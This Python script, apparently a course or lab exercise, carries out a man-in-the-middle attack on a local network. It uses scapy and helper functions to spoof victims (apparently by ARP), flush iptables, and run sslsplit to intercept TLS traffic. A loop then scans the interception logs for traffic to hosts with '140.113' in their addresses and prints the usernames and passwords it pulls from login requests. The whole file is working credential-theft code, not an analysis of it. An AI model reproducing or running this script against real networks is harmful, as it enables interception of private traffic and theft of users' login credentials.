#!./.env/bin/python
import scapy.all as scapy
import threading
import time
import os

from utils import get_victims, trick, sslsplit, LOG_DIR


def mitm():
    time.sleep(8)
    while True:
        time.sleep(1)
        for filename in os.scandir(LOG_DIR):
            if filename.is_file():
                if '140.113' in filename.path:
                    with open(filename.path, mode='r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            if line[:10] == 'logintoken':
                                line = line.split('&')
                                username = line[1].split('=')[1]
                                password = line[2].split('=')[1]
                                print(f'Username: {username}')
                                print(f'Password: {password}')
                    open(filename.path, mode='w').close()


def main():
    ips = get_victims()
    os.system('iptables -F')
    threads = list()
    threads.append(threading.Thread(target=trick, args=[ips]))
    threads.append(threading.Thread(target=sslsplit))
    threads.append(threading.Thread(target=mitm))
    for t in threads:
        t.start()


if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
